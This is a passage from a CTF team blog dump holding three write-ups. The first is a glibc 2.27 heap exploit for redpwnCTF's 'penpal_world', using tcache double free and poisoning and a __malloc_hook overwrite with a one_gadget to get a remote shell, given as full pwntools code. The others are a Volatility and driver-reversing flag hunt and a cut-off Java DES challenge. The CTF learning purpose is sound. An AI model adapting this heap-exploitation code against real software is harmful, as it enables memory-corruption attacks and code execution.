the one we need. The github link: https://github.com/skysider/pwndockerThe docker hub link: https://hub.docker.com/r/skysider/pwndocker I don’t recommend going with the LD_PRELOAD way, sure you can debug it with the right version but remember this, some offsets when leaking libc will be different from the server ones because you’re preloading it with the ld.so, if you choose to go this way remember to adapt those offsets to the right ones. Leak heap addressThis the structure of of a chunk:123456789101112+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- Chunk start| PREV_SIZE OR USER DATA |+---------------------------------+-+-+-+| CHUNK SIZE |A|M|P|+---------------------------------+-+-+-+ | FORWARD POINTER(FD) | &lt;-- All freechunks| BACK POINTER(BK) | &lt;-- normalchunk or larger| NEXT BIGGER POINTER (fd_nextsize) | &lt;-- Only if largechunk| PREVIOUS SMALLER PTR(bk_nextsize) | &lt;-- Only if largechunk| - - - - - - - - - - - - - | &lt;-- End of this chunk.| PREV_SIZE |+---------------------------------------+ The mallocs we can do are limited to 0x48 size, which is within tcache fast bin range. Since it’s a tcache bin freed items will be kept in a single-linked list. When the first fastchunk is free()‘d, it sets its FD pointer to NULL because there wasn’t any freed item yet, if we free a second item the FD pointer will be set to the previous chunk freed, by using UAF vulnerability we can print this pointer thus leaking it’s heap address, let’s start by writing our python script to do this. Some introductory stuff we can add I’m using pwntools which is a very handy framework for pwn you can find it at https://github.com/Gallopsled/pwntools 1234567891011121314from pwn import *host, port = \"chall2.2019.redpwn.net\", \"4010\"filename = \"./penpal_world\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc-2.27.so')def getConn(): return process(filename) if not args.REMOTE else remote(host, port) Since PIE is enabled we need to get its base address, to debug it in gdb we can use this function to do it: 123def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16) If you’re LD_PRELOAD the libc version you need to change the index of memory_map to 5: 123def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[5].split(\"-\")[0],16) If you’re using gdb.attach from pwntools and you’re inside a docker container remember it won’t detect the terminal to open the specific gdb window, we can use tmux for example but we need to specified it by doing this: 1234context.terminal = ['tmux', 'new-window']r = getConn()if not args.REMOTE and args.GDB: debug([0xb11]) Open two windows logged in the docker container, the 1st one run your script and on the 2nd one open tmux, when running the script gdb will automaticity open with the specified breakpoints we set in the debug list: Now that we can debug and open gdb in a very easy way it’s time to write the functions to add,free,edit and print: 12345678910111213141516def add(index): r.sendlineafter('4) Read a postcard\\n',str(1)) r.sendlineafter('Which envelope #?\\n', str(index))def edit(index, content): r.sendlineafter('4) Read a postcard\\n',str(2)) r.sendlineafter('Which envelope #?\\n', str(index)) r.sendafter('Write.\\n', content)def free(index): r.sendlineafter('4) Read a postcard\\n',str(3)) r.sendlineafter('Which envelope #?\\n', str(index))def read(index): r.sendlineafter('4) Read a postcard\\n',str(4)) r.sendlineafter('Which envelope #?\\n', str(index)) To leak an address we can for example allocate a chunk and then double free it, we then proceed to read its fd pointer which will point to the first freed chunk, this chunks will be inserted into a tcache bin due to its size of 0x48. Lets put a breakpoint on free and look how the first chunk looks like before free it the first time:123456add(0)edit(0, 'A'*0x30 + p64(0x0)+ p64(0x51))free(0)free(0) # DOUBLE FREE (no security checks while in tcache at this libc version)read(0) # LEAK HEAPr.interactive() Gdb output: Now let’s take a look after the 1st free: Lets check how tcache fast bin list is looking by using tcachebins on pwngdb: After 2nd free (Double free) Lets check again how tcache bin list is looking by using tcachebins on pwngdb: Now if we read the card at index 0 we will get a heap leak! 1234567add(0)edit(0, 'A'*0x30 + p64(0x0)+ p64(0x51))free(0)free(0) # DOUBLE FREE (no security checks while in tcache at this libc version)read(0) # LEAK HEAPheap = u64(r.recv(6).ljust(8, '\\x00'))-0x60log.info('0x%x'%heap) Results:12345678910111213141516$ python test.py[*] '/ctf/work/pwn/pepal_world/penpal_world' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*] '/lib/x86_64-linux-gnu/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Starting local process './penpal_world': pid 2596[*] 0x55d9117e3200[*] Stopped process './penpal_world' (pid 2596) LEAKING LIBCWe can only do mallocs of size 0x48, we somehow need to overwrite the size of one chunk because fastbin chunk sizes will only get us heap addresses, in order to leak a libc address we need a unsorted bin chunk size for example 0x91 will do it. Perhaps since this version of libc uses tcache, at every chunk bellow 0x410 are treated as it was a fastbin chunk even if we free a 0x91 chunk we will not get a libc address, luckily there is a limit to the tcache which is 7 we need to fill a tcache bin of size 0x91, we can do it by freeing that chunk 7 times the 8th time will be treated as an unsorted bin updating both fd and bk pointers into libc addresses. But to overwrite the size of a chunk we need to use the tcache poisoning attack you can find an example here. In the end we want malloc to return an arbitrary address where we can start writing stuff into an address that is able to overwrite the size of 0x51 to 0x91, when malloc executes it will try to find a chunk in the tcache bin of that size so it can reuse the same space in memory from previous freed chunks, if we modify the fd pointer with UAF, malloc will instead return the pointer we modified getting us an arbitrary write. First we need to find a cool address we can write to, we already leaked a heap address, we just need to find the offset near the 0x51 size, we can do it with this: The code to overwrite the size would look like this:12345678910111213add(0)edit(0, 'A'*0x30 + p64(0x0)+ p64(0x51))free(0)free(0) # DOUBLE FREE (no security checks while in tcache at this libc version)read(0) # LEAK HEAPheap = u64(r.recv(6).ljust(8, '\\x00'))-0x60edit(0,p64(heap+0x90)) # change the fd pointer to get arbitrary write with mallocadd(0) # MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0add(1) # MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0add(0) # NEW ALLOCATION (NO MEMORY REUSE) ALLOCATE CHUNK B and prevent merge with top chunkedit(0, 'B'*0x30 + p64(0x0)+ p64(0x51))free(0)edit(1,p64(0)+p64(0x91)+p64(0)+p64(0x91)) # OVERWRITES THE SIZE OF CHUNK 'B' After changing the FD with edit we need to do two mallocs until we get the right pointer, because on the first two frees the single linked list of the tcache chunks(0x50) is like this: 1heap+0x60 -&gt; heap+0x60 &lt;- 0x0 After editing the FD with heap+0x90 we get this: 1heap+0x60 -&gt; heap+0x90 &lt;- 0x0 The list after the first malloc:1heap+0x90 &lt;- 0x0 The list after the second malloc:10x0 (empty) The next step is to fill tcache bin (0x90) remember the max is 7 so we need to free 7 times. Also we need to add 2 new chunks and create two fake chunks in the end to bypass the security check from int_free, since it isn’t a tcache bin we need to worry about that. The size field of the next chunk should correspond to the size that has overwritten the size of chunk B and with a valid size with its flag prev_in_use set to 1. The lowest bit of size is the prev_in_use flag, 0x51 represented in binary is 01010001, the lowest bit is set to one. PREV_INUSE, records whether the previous chunk is allocated. In general, the P bit of the size field of the first allocated memory block in the heap is set to 1 to prevent access to the previous illegal memory. When the P bit of the size of a chunk is 0, we can get the size and address of the previous chunk through the prev_size field. The Chunk C is for this security check https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4280 The Chunk D is to prevent going into unlink at https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4303 : if we set nextinuse into 1 we won’t get an error at https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1405 because we don’t even enter at unlink One final thing, we already knew that we needed to set a fake chunk at chunk C with prev_in_use to 1 but why the size of 0x50 ? as you can see the function that calculates the offset to the prev_in_use of the fake chunk at chunk D uses function inuse_bit_at_offset which uses the size of previous 0x50(variable s) to find chunks D prev_in_use. 123456789add(1)edit(1,('C'*0x30 +p64(0x0)+p64(0x51))) # TO PREVENT double free or corruption (!prev)add(1) edit(1, ('D'*0x30+p64(0x0)+p64(0x01))) # TO PREVENT corrupted size vs. prev_size (as long as prev_in_use is set any values work (0x1,0x51,0x61 etc..)for i in range(7): # Filling tcachebin free(0)free(0) # free unsortedbinread(0) # LEAK LIBCl = u64(r.recv(6).ljust(8,'\\x00')) Lets see how this looks in GDB, this is the look of tcache bins(0x90) after the 7 frees: Now the 8th free which is the unsorted bin: Overwrite __malloc_hook with the address of a one gadgetMalloc hook executes with malloc (it’s used for debugging) initially is set to 0x0 , using TCACHE POISONING we can overwrite its address with the address of onegadget. Getting a free shell after triggering malloc. Getting the onegadget offset using https://github.com/david942j/one_gadget 123456789101112one_gadget libc-2.27.so 0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)constraints: rcx == NULL0x4f322 execve(\"/bin/sh\", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0x10a38c execve(\"/bin/sh\", rsp+0x70, environ)constraints: [rsp+0x70] == NULL The offset that works with the restriction is 0x10a38c.Making malloc to return the address of __malloc_hook and overwriting it with onegadget: 123456789101112131415LIBC_BASE = l-0x3ebca0MALLOC_HOOK = LIBC_BASE+libc.symbols['__malloc_hook']FREE_HOOK = LIBC_BASE+libc.symbols['__free_hook']ONE_GADGET = LIBC_BASE+0x10a38c############################################################################################ OVERWRITE MALLOC_HOOKfree(1)edit(1,p64(MALLOC_HOOK)) # change the address of FD to MALLOC_HOOKadd(0)add(0) # returns the address of malloc_hookedit(0,p64(ONE_GADGET)) # Overwrites content of malloc_hook to ONE_GADGETadd(0) # trigers malloc hook#########################################################r.interactive() The full exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109from pwn import *host, port = \"chall2.2019.redpwn.net\", \"4010\"filename = \"./penpal_world\"elf = ELF(filename)context.arch = 'amd64'#libc = ELF('/glibc/2.27/64/lib/libc.so.6')if not args.REMOTE: libc = elf.libc#ELF('/glibc/2.27/64/lib/libc-2.27.so')else: libc = ELF('./libc-2.27.so')#rop=ROP([libc])def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): #bp = [0xea0,0xd31,0xc52] #bp = [0x00000dfb,0x00000b7c,0x00000d10] script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(PIE+x) gdb.attach(r,gdbscript=script)def add(index): r.sendlineafter('4) Read a postcard\\n',str(1)) r.sendlineafter('Which envelope #?\\n', str(index)) #r.sendlineafter()def edit(index, content): r.sendlineafter('4) Read a postcard\\n',str(2)) r.sendlineafter('Which envelope #?\\n', str(index)) r.sendafter('Write.\\n', content)def free(index): r.sendlineafter('4) Read a postcard\\n',str(3)) r.sendlineafter('Which envelope #?\\n', str(index)) #r.recvuntil('Command me: ')def read(index): r.sendlineafter('4) Read a postcard\\n',str(4)) r.sendlineafter('Which envelope #?\\n', str(index))context.terminal = ['tmux', 'new-window']r = getConn()if not args.REMOTE and args.GDB: debug([0xb11,0x9b3])#0xb11,0x9b3]) #0x9b3 0xB11 0xa7c####################################### LEAK FUCKING LIBCadd(0)edit(0, 'A'*0x30 + p64(0x0)+ p64(0x51))free(0)free(0) # DOUBLE FREE (no security checks while in tcache at this libc version)read(0) # LEAK HEAPheap = u64(r.recv(6).ljust(8, '\\x00'))-0x60log.info('0x%x'%heap)log.info('0x%x'%(heap+0x100))edit(0,p64(heap+0x90)) # change the fd pointer to get arbitrary write with mallocadd(0) # MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0add(1) # MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0add(0) # NEW ALLOCATION (NO MEMORY REUSE) THIS ONE IS DONE HERE TO PREVENT MERGE WITH TOP CHUNKedit(0, 'B'*0x30 + p64(0x0)+ p64(0x51))edit(1,p64(0)+p64(0x91)+p64(0)+p64(0x91)) # OVERWRITES THE SIZE OF CHUNK 'B'add(1) # TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BINedit(1,('C'*0x30 +p64(0x0)+p64(0x51)))add(1) # TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BINedit(1, ('D'*0x30+p64(0x0)+p64(0x51)))for i in range(7): # Filling tcachebin free(0)free(0) # free unsortedbinread(0) # LEAK LIBCl = u64(r.recv(6).ljust(8,'\\x00'))#log.info(hex(rop.search(regs=['rdi'], order = 'regs').address))LIBC_BASE = l-0x3ebca0MALLOC_HOOK = LIBC_BASE+libc.symbols['__malloc_hook']FREE_HOOK = LIBC_BASE+libc.symbols['__free_hook']SYSTEM = LIBC_BASE+ libc.symbols['system']BINSH = LIBC_BASE+ libc.search('/bin/sh').next()ONE_GADGET = LIBC_BASE+0x10a38cPOPRDI = LIBC_BASE+0x2155f # pop rdi ; retlog.info(\"MAIN ARENA+0x96 0x%x\"%l)log.info(\"LIBCBASE 0x%x\"%LIBC_BASE)log.info(\"ONEGADGET 0x%x\"%ONE_GADGET)log.info(\"MALLOC HOOK 0x%x\"%MALLOC_HOOK)log.info(\"FREE HOOK 0x%x\"%FREE_HOOK)log.info(\"SYSTEM 0x%x\"%SYSTEM)log.info(\"BIN_SH 0x%x\"%BINSH)log.info(\"POP RDI 0x%x\"%POPRDI)log.info(\"JUMP 0x%x\"%(heap+0x150))#0x1d8b6b0))log.info(\"HEAP 0x%x\"%(heap)) #24log.info(\"NEXT HEAP 0x%x\"%(heap+0x130))############################################################################################ OVERWRITE MALLOC_HOOKfree(1)edit(1,p64(MALLOC_HOOK)) # change the address of FD to MALLOC_HOOKadd(0)add(0) # returns the address of malloc_hookedit(0,p64(ONE_GADGET)) # Overwrites content of malloc_hook to ONE_GADGETadd(0) # trigers malloc hook#########################################################r.interactive() Running it 123456789101112131415161718192021222324252627282930$ root@redpwn:/ctf/work/pwn/pepal_world# python penpal_world.py REMOTE[*] '/ctf/work/pwn/pepal_world/penpal_world' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*] '/ctf/work/pwn/pepal_world/libc-2.27.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to chall2.2019.redpwn.net on port 4010: Done[*] 0x561de3031200[*] 0x561de3031300[*] MAIN ARENA+0x96 0x7f79a7fe2ca0[*] LIBCBASE 0x7f79a7bf7000[*] ONEGADGET 0x7f79a7d0138c[*] MALLOC HOOK 0x7f79a7fe2c30[*] FREE HOOK 0x7f79a7fe48e8[*] SYSTEM 0x7f79a7c46440[*] BIN_SH 0x7f79a7daae9a[*] POP RDI 0x7f79a7c1855f[*] JUMP 0x561de3031350[*] HEAP 0x561de3031200[*] NEXT HEAP 0x561de3031330[*] Switching to interactive mode$ cat flag.txtflag&#123;0h_n0e5_sW1p3r_d1D_5w!peEEeE&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"Tcache","slug":"Pwn/x64/Glibc-Malloc/Tcache","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"},{"name":"tcache_dup","slug":"Pwn/x64/Glibc-Malloc/Tcache/tcache-dup","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-dup/"},{"name":"tcache_poisoning","slug":"Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning/"}],"tags":[{"name":"double_free","slug":"double-free","permalink":"https://teamrocketist.github.io/tags/double-free/"},{"name":"use_after_free","slug":"use-after-free","permalink":"https://teamrocketist.github.io/tags/use-after-free/"},{"name":"tcache_poisoning","slug":"tcache-poisoning","permalink":"https://teamrocketist.github.io/tags/tcache-poisoning/"},{"name":"heap","slug":"heap","permalink":"https://teamrocketist.github.io/tags/heap/"},{"name":"redpwnctf2017","slug":"redpwnctf2017","permalink":"https://teamrocketist.github.io/tags/redpwnctf2017/"}]},{"title":"[Reverse] CyBRICS CTF Quals 2019 - Hidden Flag","slug":"Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag","date":"2019-07-27T15:31:43.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2019/07/27/Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag/","link":"","permalink":"https://teamrocketist.github.io/2019/07/27/Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag/","excerpt":"","text":"Hidden Flag 220 Description:Hidden Flag (Reverse, Hard, 220 pts) Author: Khanov Artur (awengar)Somebody hides flag in RAM. Catch itRaw dump: https://cybrics.net/files/20190717.zip.torrent I didn’t solve this challenge during the ctf, one of the main reasons was because the challenge was a mix of a forensics/reverse, I got stuck on the forensics part, mostly because I don’t have much experience looking at memory dumps, the reversing part was pretty easy after finding the “malicious” binary. Forensics partSo we start with a memdump and we somehow need to find the flag in memory, I used volatility for this part. The first thing we have to do is to find the most suitable profile for the dump, volatility has a command named imageinfo which can help us with that: 12345678910111213141516$ volatility -f 20190717.mem imageinfoVolatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win2016x64_14393, Win10x64_14393, Win10x64_16299, Win10x64_17134, Win10x64_15063 AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/home/fucker/Downloads/volq/20190717.mem) PAE type : No PAE DTB : 0x1ad002L KDBG : 0xf8005b5a3520L Number of Processors : 2 Image Type (Service Pack) : 0 KPCR for CPU 0 : 0xfffff8005a4ee000L KPCR for CPU 1 : 0xffff800121420000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2019-07-17 23:48:54 UTC+0000 Image local date and time : 2019-07-17 16:48:54 -0700 Volatility suggests 5 profiles, Win10x64_17134 is the most updated so I opted to use that one. This is the part where I got stuck I kept insisting on looking only at processes during the ctf, I used comands like pslist, psxview etc and I found some interesting processes that weren’t listed in pslist : 12345678910$ volatility -f 20190717.mem --profile Win10x64_17134 psxviewVolatility Foundation Volatility Framework 2.6Offset(P) Name PID pslist psscan thrdproc pspcid csrss sessiodn deskthrd ExitTime------------------ -------------------- ------ ------ ------ -------- ------ ----- ------- -------- --------... truncated ...0x000000002736c580 dllhost.exe 5024 False True True False True False True ... truncated ...0x0000000070b46a20 32...2 False False False False False False True ... truncate ...0x000000001ff17580 dllhost.exe 240 False True True False False False False As you can see this 3 processes are not shown in pslist one of them doesn’t even have a name or a valid PID, I tried to dump the memory of this 3 but I was not able to do it, for some reason volatility was spiting errors, I also dumped part of the registry too trying to find something useful but that also failed.Much later I decided to view the list of kernel drivers loaded on the system, for this I used the modules command. This command walks the doubly-linked list of LDR_DATA_TABLE_ENTRY structures pointed to PsLoadedModuleList. However this cannot find hidden/unlinked kernel drivers but if this doesn’t work we can also try to do a modscan which serves that purpose. The output of the modules command: 12345678910volatility -f 20190717.mem --profile Win10x64_17134 modulesVolatility Foundation Volatility Framework 2.6Offset(V) Name Base Size File------------------ -------------------- ------------------ ------------------ ----... truncated...0xffffd88ec1e8e010 vmhgfs.sys 0xfffff8005da80000 0x2b000 \\SystemRoot\\system32\\DRIVERS\\vmhgfs.sys0xffffd88ec1fdd8c0 condrv.sys 0xfffff8005dab0000 0x12000 \\SystemRoot\\System32\\drivers\\condrv.sys0xffffd88ec45fb240 WdNisDrv.sys 0xfffff8005dad0000 0x12000 \\SystemRoot\\system32\\drivers\\wd\\WdNisDrv.sys0xffffd88eda5c83d0 Flagostor.sys 0xfffff8005daf0000 0x7000 \\??\\C:\\t4est\\Flagostor.sys0xffffd88ec2981480 RamCaptur...er64.SYS 0xfffff8005db00000 0x7000 \\??\\C:\\Users\\test\\Desktop\\RamCapturer\\x64\\RamCaptureDriver64.SYS We didn’t even ran modscan and we already find two weird drivers that are loaded directly from a strange path C:\\t4est and C:\\test, this isn’t normal, the normal thing to happen is to be loaded from the system32 folder… Obviously RamCaptureDriver64.sys is probably what the creator used to dump this memory, so we are left with flagostor.sys which already has a weird name and also hints for flag after this I used moddump to extract this driver: 12345$ volatility -f 20190717.mem --profile Win10x64_17134 moddump -b 0xfffff8005daf0000 -D .Volatility Foundation Volatility Framework 2.6Module Base Module Name Result------------------ -------------------- ------0xfffff8005daf0000 Flagostor.sys OK: driver.fffff8005daf0000.sys Checking what kind of file: 12$ file driver.fffff8005daf0000.sysdriver.fffff8005daf0000.sys: PE32+ executable (native) x86-64, for MS Windows And this is it, the forensics part is over lets go for the reversing part. Reversing partWe have now a PE executable, I used both IDA and Ghidra, this time Ghidra actually helped me decoding the final part of the decryption function (Pseudo c code was somehow presented better than ida at least from my perspective). I first started analysing with IDA, the main function sub_FFFFF8005DAF1000 which I renamed later to printLoader in the picture below: So lets check the next function: Dumping the global variable (Double click on unk_FFFFF8005DAF3000): Analysing sub_FFFFF8005DAF1440: Since we can convert assembly to pseudo code c in IDA we can easily convert this function into python: Creating a python script for this:123456789101112131415def generate_table(key): table = [] for i in xrange(256): table.append(i) v6 = 0 for j in xrange(256): iVar1 = ord(key[j%len(key)]) + table[j] + v6 v6 = ((iVar1&amp;0xff) + iVar1) - iVar1 # swap aux = table[j] table[j] = table[v6] table[v6] = aux ########## return table The same thing can be done for the decryptFlag function in this case I chose to use GHIDRA which the pseudo code was a bit more understandable for me at least: Once again this could easily be converted to python: 1234567891011121314151617181920212223242526def decrypt_flag(table,flagB): l = len(flagB) flag = [] for x in xrange(l): flag.append('x') local_38 = 0; local_34 = 0; local_28 = 0; local_20 = l; while (local_28 &lt; local_20): local_38 = local_38 + 1 &amp; 0xff local_34 = local_34 + table[local_38] &amp; 0xff # swap aux = table[local_38] table[local_38] = table[local_34] table[local_34] = aux ########## flag[local_28] = table[table[local_38]+table[local_34] &amp; 0xff] ^ ord(flagB[local_28]) local_28 = local_28 + 1; return ''.join([chr(x) for x in flag]) Obviously there was no need to rewrite all of this in python if you manage to run the binary on your computer in my case I wasn’t able to do it in my virtual machine due to some errors that I don’t know, if you could run it you just needed to put a break point in the end and watch the stored values obtaining the flag with ease. The final python script: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849flagB = '\\x2D\\xFB\\x9B\\xA8\\x21\\xF8\\xB0\\xB5\\xFA\\xEC\\x58\\xC5\\xF9\\x35\\x57\\xFA\\xE1\\x62\\x0E\\x19\\x45\\x7D\\x33\\x58\\x6F\\xC9\\x88\\x4F\\x70\\x82'key = 'qweasdzxc'def generate_table(key): table = [] for i in xrange(256): table.append(i) v6 = 0 for j in xrange(256): iVar1 = ord(key[j%len(key)]) + table[j] + v6 v6 = ((iVar1&amp;0xff) + iVar1) - iVar1 # swap aux = table[j] table[j] = table[v6] table[v6] = aux ########## return tabledef decrypt_flag(table,flagB): l = len(flagB) flag = [] for x in xrange(l): flag.append('x') local_38 = 0; local_34 = 0; local_28 = 0; local_20 = l; while (local_28 &lt; local_20): local_38 = local_38 + 1 &amp; 0xff local_34 = local_34 + table[local_38] &amp; 0xff # swap aux = table[local_38] table[local_38] = table[local_34] table[local_34] = aux ########## flag[local_28] = table[table[local_38]+table[local_34] &amp; 0xff] ^ ord(flagB[local_28]) local_28 = local_28 + 1; return ''.join([chr(x) for x in flag])print decrypt_flag(generate_table(key), flagB) Getting the flag: 12$ python hiddenFlag/hidden.py cybrics&#123;H1DD3N_D33P_1N_NTKRNL&#125; The flag was cybrics{H1DD3N_D33P_1N_NTKRNL}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"volatility","slug":"volatility","permalink":"https://teamrocketist.github.io/tags/volatility/"},{"name":"memory","slug":"memory","permalink":"https://teamrocketist.github.io/tags/memory/"},{"name":"ghidra","slug":"ghidra","permalink":"https://teamrocketist.github.io/tags/ghidra/"}]},{"title":"[Reverse] CyBRICS CTF Quals 2019 - Matreshka","slug":"Reverse-CyBRICS-CTF-Quals-2019-Matreshka","date":"2019-07-22T09:29:14.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2019/07/22/Reverse-CyBRICS-CTF-Quals-2019-Matreshka/","link":"","permalink":"https://teamrocketist.github.io/2019/07/22/Reverse-CyBRICS-CTF-Quals-2019-Matreshka/","excerpt":"","text":"Matreshka 50 Description:Matreshka (Reverse, Easy, 50 pts) Author: Khanov Artur (awengar)Matreshka hides flag. Open ithttps://cybrics.net/files/matreshka.zip Decompiling javaAfter unzipping the file we find 2 files one is a .class and an encrypted file. First thing that I did was to decompile the .class file I used this website to do it http://www.decompiler.com12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import javax.crypto.Cipher;import javax.crypto.SecretKey;import javax.crypto.SecretKeyFactory;import javax.crypto.spec.DESKeySpec;class Code2 &#123; public static byte[] decode(byte[] var0, String var1) throws Exception &#123; SecretKeyFactory var2 = SecretKeyFactory.getInstance(\"DES\"); byte[] var3 = var1.getBytes(); DESKeySpec var4 = new DESKeySpec(var3); SecretKey var5 = var2.generateSecret(var4); Cipher var6 = Cipher.getInstance(\"DES\"); var6.init(2, var5); byte[] var7 = var6.doFinal(var0); return var7; &#125; public static byte[] encode(byte[] var0, String var1) throws Exception &#123; SecretKeyFactory var2 = SecretKeyFactory.getInstance(\"DES\"); byte[] var3 = var1.getBytes(); DESKeySpec var4 = new DESKeySpec(var3); SecretKey var5 = var2.generateSecret(var4); Cipher var6 = Cipher.getInstance(\"DES\"); var6.init(1, var5); byte[] var7 = var6.doFinal(var0); return var7; &#125; public static void main(String[] var0) throws Exception &#123; String var1 = \"matreha!\"; byte[] var2 = encode(System.getProperty(\"user.name\").getBytes(), var1); byte[] var3 = new byte[]&#123;76, -99, 37, 75, -68, 10, -52, 10, -5, 9, 92, 1, 99, -94, 105, -18&#125;; for(int var4 = 0; var4 &lt; var3.length; ++var4) &#123; if (var3[var4] != var2[var4]) &#123; System.out.println(\"No\"); return; &#125; &#125; File var9 = new File(\"data.bin\"); FileInputStream var5 = new FileInputStream(var9); byte[] var6 = new byte[(int)var9.length()]; var5.read(var6); var5.close(); byte[] var7 = decode(var6, System.getProperty(\"user.name\")); FileOutputStream var8 = new FileOutputStream(\"stage2.bin\"); var8.write(var7, 0, var7.length); var8.flush(); var8.close(); &#125;&#125; Interpreting the java fileNow that we have some java code I started to analyse the decode and encode functions and we can easily see that the algorithm used for the encryption was DES, the encode function encrypts an array of bytes with a key string, the decode function obviously does the opposite. 12345678910public static byte[] encode(byte[] var0, String var1) throws Exception &#123; SecretKeyFactory var2 = SecretKeyFactory.getInstance(\"DES\"); byte[] var3 = var1.getBytes(); DESKeySpec var4 = new DESKeySpec(var3); SecretKey var5 = var2.generateSecret(var4); Cipher var6 = Cipher.getInstance(\"DES\"); var6.init(1, var5); byte[] var7 = var6.doFinal(var0); return var7; &#125; By looking at the main function we can see the key used to encrypt the file was an username from the machine of the creator of the challenge, we don’t know this username but we do know the result of the encryption of this username and the key used: 12345678910String var1 = \"matreha!\";byte[] var2 = encode(System.getProperty(\"user.name\").getBytes(), var1);byte[] var3 = new byte[]&#123;76, -99, 37, 75, -68, 10, -52, 10, -5, 9, 92, 1, 99, -94, 105, -18&#125;;for(int var4 = 0; var4 &lt; var3.length; ++var4) &#123; if (var3[var4] != var2[var4]) &#123; System.out.println(\"No\"); return; &#125;&#125; We can easily reverse this since we have the key matreha! we can just use the decode function to decrypt the username and use it to decrypt the stage2.bin, I did small modifications to the java file and ended up with this: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import javax.crypto.Cipher;import javax.crypto.SecretKey;import javax.crypto.SecretKeyFactory;import javax.crypto.spec.DESKeySpec;class Code2&#123; public static byte[] decode(byte[] paramArrayOfByte, String paramString) throws Exception &#123; SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(\"DES\"); byte[] arrayOfByte = paramString.getBytes(); DESKeySpec dESKeySpec = new DESKeySpec(arrayOfByte); SecretKey secretKey = secretKeyFactory.generateSecret(dESKeySpec); Cipher cipher = Cipher.getInstance(\"DES\"); cipher.init(2, secretKey); return cipher.doFinal(paramArrayOfByte); &#125; public static byte[] encode(byte[] paramArrayOfByte, String paramString) throws Exception &#123; SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(\"DES\"); byte[] arrayOfByte = paramString.getBytes(); DESKeySpec dESKeySpec = new DESKeySpec(arrayOfByte); SecretKey secretKey = secretKeyFactory.generateSecret(dESKeySpec); Cipher cipher = Cipher.getInstance(\"DES\"); cipher.init(1, secretKey); return cipher.doFinal(paramArrayOfByte); &#125; public static void main(String[] paramArrayOfString) throws Exception &#123; String str = \"matreha!\"; byte[] arrayOfByte2 = &#123; 76, -99, 37, 75, -68, 10, -52, 10, -5, 9, 92, 1, 99, -94, 105, -18 &#125;; byte[] userName = decode(arrayOfByte2, str); byte[] arrayOfByte1 = encode(userName, str); for (byte b = 0; b &lt; arrayOfByte2.length; b++) &#123; if (arrayOfByte2[b] != arrayOfByte1[b]) &#123; System.out.println(\"No\"); return; &#125; &#125; File file = new File(\"data.bin\"); FileInputStream fileInputStream = new FileInputStream(file); byte[] arrayOfByte3 = new byte[(int)file.length()]; fileInputStream.read(arrayOfByte3); fileInputStream.close(); byte[] arrayOfByte4 = decode(arrayOfByte3, new String(userName)); FileOutputStream fileOutputStream = new FileOutputStream(\"stage2.bin\"); 